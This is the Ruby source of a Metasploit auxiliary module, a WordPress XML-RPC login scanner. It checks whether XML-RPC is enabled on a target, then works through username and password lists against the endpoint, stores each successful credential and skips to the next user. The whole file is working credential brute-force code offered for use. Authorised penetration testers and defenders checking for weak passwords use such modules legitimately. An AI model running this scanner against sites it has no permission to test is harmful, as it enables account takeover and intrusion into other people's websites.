##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/wordpress_rpc'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
     'Name'         => 'Wordpress XML-RPC Username/Password Login Scanner',
     'Description'  => '
       This module attempts to authenticate against a Wordpress-site
       (via XMLRPC) using username and password combinations indicated
       by the USER_FILE, PASS_FILE, and USERPASS_FILE options.
      ',
     'Author'      =>
       [
         'Cenk Kalpakoglu <cenk.kalpakoglu[at]gmail.com>',
       ],
     'License'     => MSF_LICENSE,
     'References'  =>
       [
         ['URL', 'https://wordpress.org/'],
         ['URL', 'http://www.ethicalhack3r.co.uk/security/introduction-to-the-wordpress-xml-rpc-api/'],
         ['CVE', '1999-0502'] # Weak password
       ]
      ))

    register_options(
        [
          Opt::RPORT(80),
        ])

    deregister_options('BLANK_PASSWORDS') # we don't need this option
  end

  def run_host(ip)
    print_status("#{peer}:#{wordpress_url_xmlrpc} - Sending Hello...")
    if wordpress_xmlrpc_enabled?
      vprint_good("XMLRPC enabled, Hello message received!")
    else
      print_error("XMLRPC is not enabled! Aborting")
      return :abort
    end

    print_status("Starting XML-RPC login sweep...")

    cred_collection = Metasploit::Framework::CredentialCollection.new(
        blank_passwords: datastore['BLANK_PASSWORDS'],
        pass_file: datastore['PASS_FILE'],
        password: datastore['PASSWORD'],
        user_file: datastore['USER_FILE'],
        userpass_file: datastore['USERPASS_FILE'],
        username: datastore['USERNAME'],
        user_as_pass: datastore['USER_AS_PASS'],
    )

    scanner = Metasploit::Framework::LoginScanner::WordpressRPC.new(
      configure_http_login_scanner(
        uri: wordpress_url_xmlrpc,
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 5,
        http_username: datastore['HttpUsername'],
        http_password: datastore['HttpPassword']
      )
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: self.fullname,
          workspace_id: myworkspace_id
      )
      case result.status
        when Metasploit::Model::Login::Status::SUCCESSFUL
          print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
          credential_core = create_credential(credential_data)
          credential_data[:core] = credential_core
          create_credential_login(credential_data)
          :next_user
        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
          if datastore['VERBOSE']
            print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
          end
          invalidate_login(credential_data)
          :abort
        when Metasploit::Model::Login::Status::INCORRECT
          if datastore['VERBOSE']
            print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
          end
          invalidate_login(credential_data)
      end
    end

  end
end
